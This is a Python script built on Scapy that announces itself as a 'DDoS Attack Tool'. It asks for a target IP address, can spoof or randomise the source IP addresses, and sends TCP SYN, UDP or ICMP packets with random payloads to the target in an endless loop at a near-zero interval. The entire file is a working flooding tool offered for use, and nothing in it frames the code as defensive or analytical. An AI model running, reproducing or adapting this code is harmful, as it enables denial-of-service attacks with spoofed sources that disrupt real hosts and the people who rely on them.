from curses.ascii import isdigit
from sys import flags
# from select import devpoll
from scapy.all import *
import time

global is_random_ip
is_random_ip = False

global is_random_src_port
is_random_src_port = False

global is_random_dst_port
is_random_dst_port = False

global is_random_pkt_len
is_random_pkt_len = False

global source_port
source_port = -1

global destination_port
destination_port = -1

global pkt_len
pkt_len = 0

global spoof_ip
spoof_ip = 0

# Check IPv4 format
def validate_ip_address(address):
   parts = address.split(".")

   if len(parts) != 4:
      print("-->IP address {} is not valid".format(address))
      return False

   for part in parts:
      # if not isinstance(int(part), int):
      if part.isdigit() is not True:
         print("-->IP address {} is not valid".format(address))
         return False

      if int(part) < 0 or int(part) > 255:
         print("-->IP address {} is not valid".format(address))
         return False
 
   print("-->IP address {} is valid".format(address))
   return True 

# Check port value
def validate_port_number(port):
   if port.isdigit() is not True:
      print("-->Port is not valid")
      return False

   if int(port) < 0 or int(port) > 65536:
      print("-->Port {} is out of range (0-65536)".format(port))
      return False
   
   print("-->Port {} is valid".format(port))
   return True

# Set source IP
def set_source_ip(is_spoof_ip):
   src_IP = ""
   is_random_ip = False
   if is_spoof_ip == 1:
      while True:
         src_IP = input("\nEnter IP address of Source: ")

         if src_IP == "":
            print("-->Set random IP")
            is_random_ip = True     
            break

         if validate_ip_address(src_IP):
            break
   return src_IP, is_random_ip

# Set target IP
def set_target_IP():
   target_IP = ""
   while True:
      target_IP = input("\nEnter IP address of Target: ")

      if target_IP == "":
         print("-->Target IP address is not valid")   
         continue

      if validate_ip_address(target_IP):
         break
   
   return target_IP

# Set source port
def set_source_port(is_random_src_port):
   while True:      
      src_port = input("\nEnter Source Port Number:")
      if src_port == "":
         print("-->Set random port")
         src_port = -1
         is_random_src_port = True
         break

      if validate_port_number(src_port):
         break

   return int(src_port), is_random_src_port

# Set destination port
def set_destination_port(is_random_dst_port):
   while True:      
      dst_port = input("\nEnter Destination Port Number: ")
      if dst_port == "":
         print("-->Set random port")
         dst_port = -1
         is_random_dst_port = True
         break

      if validate_port_number(dst_port):
         break

   return int(dst_port), is_random_dst_port

# Set packet length
def set_pkt_len(is_random_pkt_len):
   pkt_len = 0
   while True:
      pkt_len = input("\nEnter Packet Length: ")
      if pkt_len == "":
         print("--> Set random length")
         pkt_len == -1
         is_random_pkt_len = True
         break

      if pkt_len.isdigit() is not True or int(pkt_len) < 0 or int(pkt_len) > 65535:
         print("Packet length is not valid!")
         continue

      else:
         print("--> Packet length: {}".format(pkt_len))
         is_random_pkt_len = False
         break

   return pkt_len, is_random_pkt_len

# Set random IP address
def rand_ip():
   a = str(random.randint(1,254))
   b = str(random.randint(1,254))
   c = str(random.randint(1,254))
   d = str(random.randint(1,254))
   dot = "."

   rip = a + dot + b + dot + c + dot + d
   
   return rip

# Set random port number
def rand_port():
   rport = random.randint(0,65535)

   return rport

# Send packet with specific parameters
def send_packet(IP1, ip_proto, source_port, destination_port, pkt_len, is_random_src_port, is_random_dst_port, is_random_pkt_len):
   if ip_proto != 0:
      if is_random_src_port == True:
         source_port = rand_port()
      
      if is_random_dst_port == True:
         destination_port = rand_port()

      if (is_random_pkt_len == True):
         pkt_len = random.randint(0, 65534)

      if ip_proto == 1:
         TCP1 = TCP(sport = source_port, dport = destination_port, flags = 'S')
         pkt = IP1 / TCP1 / Raw(RandString(size = int(pkt_len)))
         send(pkt, inter = .000001)
         return

      if ip_proto == 2:
         UDP1 = UDP(sport = source_port, dport = destination_port)
         pkt = IP1 / UDP1 / Raw(RandString(size = int(pkt_len)))
         send(pkt, inter = .000001)
         return
   else:
      pkt = IP1 / ICMP()
      send(pkt, inter = .000001)
      return

if __name__ == '__main__':
   print("\n\n")
   print("----------------------------------------------------------------")
   print("----------------------------------------------------------------")
   print("----------------------------------------------------------------")
   print("-------------------Welcome to DDoS Attack Tool------------------")
   print("----------------------Written by TuanNQ-VCS---------------------")
   print("----------------------------------------------------------------")
   print("----------------------------------------------------------------")
   print("----------------------------------------------------------------")
   print("\nDo you want to spoof source IP address?")
   print("Please choose:")
   print("\t0: No")
   print("\t1: Yes\n")

   while True:
      spoof_ip = input("--> You press: ")
      if (spoof_ip.isdigit() == False or (int(spoof_ip) != 0 and int(spoof_ip) != 1)):
         print("Please choose either 0 or 1!")
         
      else:
         spoof_ip = int(spoof_ip)
         break

   source_ip, is_random_ip = set_source_ip(int(spoof_ip))
   target_ip = set_target_IP()

   print("\nPlease choose protocol:")
   print("    0: ICMP")
   print("    1: TCP")
   print("    2: UDP\n")

   ip_proto = 0
   while True:
      ip_proto = input("--> You press: ")
      if (ip_proto.isdigit() == False or (int(ip_proto) != 0 and int(ip_proto) != 1 and int(ip_proto) != 2)):
         print("Please choose either 0 or 1 or 2!")
         
      else:
         ip_proto = int(ip_proto)
         break

   if (ip_proto != 0):
      source_port, is_random_src_port = set_source_port(is_random_src_port)
      destination_port, is_random_dst_port = set_destination_port(is_random_dst_port)
      pkt_len, is_random_pkt_len = set_pkt_len(is_random_pkt_len)

   print("\n\t############Summary############")
   if spoof_ip == 1:
      if is_random_ip == True:
         print("\tSource IP address: Random")
      else: 
         print("\tSource IP address: {}".format(source_ip))
   else:
      print("\tSource IP address: Default local")

   print("\tTarget IP address: {}".format(target_ip))

   if is_random_src_port == True:
      print("\tSource Port Number: Random")
   else:
      if source_port == -1:
         print("\tSource Port Number: None")
      else:
         print("\tSource Port Number: {}".format(source_port))

   if is_random_dst_port == True:
      print("\tTarget Port Number: Random")
   else:
      if destination_port == -1:
         print("\tDestination Port Number: None")
      else:
         print("\tDestination Port Number: {}".format(destination_port))

   if ip_proto == 0:
      print("\tProtocol: ICMP")
   if ip_proto == 1:
      print("\tProtocol: TCP")
      print("\tFlag: SYN")
   if ip_proto == 2:
      print("\tProtocol: UDP")

   if ip_proto != 0:
      if is_random_pkt_len == True:
         print("\tPacket Length: Random")
      else:
         print("\tPacket length: {}".format(pkt_len))

   print("\t###############################\n")

   while True:
      ack = input("\nDo you want to attack (y/n): ")
      ack = str(ack)
      if (ack != 'y' and ack != 'n'):
         print("Please choose y (yes) or n (no)!")
         continue
      if ack == 'y':
         break
      if ack == 'n':
         exit()

   print("\nStarting attack...")
   time.sleep(1)

   while True:
      if spoof_ip == 1:
         if is_random_ip == True:
            source_ip = rand_ip()
         IP1 = IP(src = source_ip, dst = target_ip)
         send_packet(IP1, ip_proto, source_port, destination_port, pkt_len, is_random_src_port, is_random_dst_port, is_random_pkt_len)
      else:
         IP1 = IP(dst = target_ip)
         send_packet(IP1, ip_proto, source_port, destination_port, pkt_len, is_random_src_port, is_random_dst_port, is_random_pkt_len)
         